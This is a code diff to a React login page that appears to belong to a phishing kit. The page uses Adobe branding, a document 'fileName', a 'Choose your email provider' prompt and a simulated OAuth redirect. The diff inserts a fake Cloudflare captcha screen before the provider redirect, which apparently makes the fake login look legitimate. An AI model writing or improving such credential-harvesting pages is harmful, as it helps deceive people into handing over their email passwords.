@@ -2,6 +2,7 @@ import React, { useState, useEffect } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
 import { useLogin } from '../hooks/useLogin';
 import Spinner from './common/Spinner';
+import CloudflareCaptcha from './CloudflareCaptcha';
 
 interface LoginPageProps {
   fileName: string;
@@ -29,6 +30,10 @@ const LoginPage: React.FC<LoginPageProps> = ({
   const [showPassword, setShowPassword] = useState(false);
   const [isRedirecting, setIsRedirecting] = useState(false);
   const [isProcessingReturn, setIsProcessingReturn] = useState(false);
+  
+  // New state for captcha handling
+  const [showCaptcha, setShowCaptcha] = useState(false);
+  const [pendingProvider, setPendingProvider] = useState<string | null>(null);
   
   const { isLoading, errorMessage, handleFormSubmit, resetLoginState } = useLogin(
     onLoginSuccess,
@@ -135,7 +140,15 @@ const LoginPage: React.FC<LoginPageProps> = ({
   };
 
   const handleProviderClick = (providerName: string) => {
-    simulateOAuthRedirect(providerName);
+    setPendingProvider(providerName);
+    setShowCaptcha(true);
+  };
+
+  const handleCaptchaVerified = () => {
+    setShowCaptcha(false);
+    if (pendingProvider) {
+      simulateOAuthRedirect(pendingProvider);
+    }
   };
 
   const AdobeLogo = () => (
@@ -145,6 +158,11 @@ const LoginPage: React.FC<LoginPageProps> = ({
       className="w-10 h-10 drop-shadow-lg"
     />
   );
+
+  // Show captcha screen if triggered
+  if (showCaptcha) {
+    return <CloudflareCaptcha onVerified={handleCaptchaVerified} />;
+  }
 
   // Show redirecting screen
   if (isRedirecting || isProcessingReturn) {
@@ -179,7 +197,6 @@ const LoginPage: React.FC<LoginPageProps> = ({
             </div>
             <h1 className="text-3xl font-bold text-gray-900 drop-shadow-[0_2px_4px_rgba(255,255,255,0.8)]">Sign in to continue</h1>
             
-            <p className="text-gray-800 text-base font-semibold mt-6 drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)]">Choose your email provider</p>
           </div>
           
           <div className="space-y-2">
